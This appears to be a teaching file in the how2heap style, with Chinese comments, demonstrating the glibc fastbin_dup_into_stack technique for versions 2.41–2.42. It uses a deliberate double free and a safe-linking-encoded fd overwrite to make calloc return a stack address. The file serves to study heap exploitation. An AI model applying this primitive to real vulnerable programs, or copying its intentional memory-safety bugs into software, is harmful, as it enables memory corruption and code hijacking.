/*
 * 中文导读（CTF 版）
 *
 * 手法：fastbin_dup_into_stack
 * 文件标注范围：2.41 ~ 2.42
 * 模拟漏洞：double free 加 UAF，可改写已经重新取回的 fastbin chunk 的 fd。
 * 核心流程：先得到 A→B→A，再把 A->fd 改成伪造 chunk 头；2.32 起写入的是 (存储位置>>12)^目标地址。
 * 成功判据：最后一次 malloc/calloc 返回栈上预期地址；目标的对齐与伪造 size 必须通过当前版本检查。
 *
 * 阅读约定：malloc 返回的是 user data；源码里 p[-1] 通常是 size，p[-2]
 * 是 prev_size。所有故意的 UAF、越界和 double free 都是漏洞模拟，不是正常 C 用法。
 * 版本范围以本目录 README 和验证矩阵为准；发行版回移补丁时应按实际 libc 源码判断。
 */

#include <stdio.h>
#include <stdlib.h>
#include <assert.h>
#include <unistd.h>

int main()
{
	setbuf(stdout, NULL);

	unsigned long stack_var[4] __attribute__ ((aligned (0x10)));

	void *ptrs[7];

	for (int i=0; i<7; i++) {
		ptrs[i] = malloc(8);
	}

	int *a = calloc(1,8);
	int *b = calloc(1,8);
	calloc(1,8); // 保护块防止 b 与 top 合并。

	for (int i=0; i<7; i++) {
		free(ptrs[i]);
	}

	free(a);

	free(b);

	/* 漏洞模拟开始/结束 */
	free(a);
	/* 漏洞模拟开始/结束 */

	for (int i = 0; i < 7; i++) {
		ptrs[i] = malloc(8);
	}

	unsigned long *d = calloc(1,8);

	// 2.41 起 calloc 会优先使用 tcache；前面已用 7 次 malloc 把该 bin 耗尽，所以这里才继续从 fastbin 取出 b。
	void *second = calloc(1,8);
	assert(second == b);

	stack_var[1] = 0x20;

	unsigned long ptr = (unsigned long)stack_var+0x10;
	unsigned long addr = (unsigned long) d;
	/* 漏洞模拟开始/结束 */
	*d = (addr >> 12) ^ ptr;
	/* 漏洞模拟开始/结束 */

	// 再次取出 a 后，safe-linking 解码出的伪造指针会成为 fastbin 的新表头。
	void *third = calloc(1,8);
	assert(third == a);

	void *p = calloc(1, 8);

	assert((unsigned long)p == (unsigned long)stack_var+0x10);
}
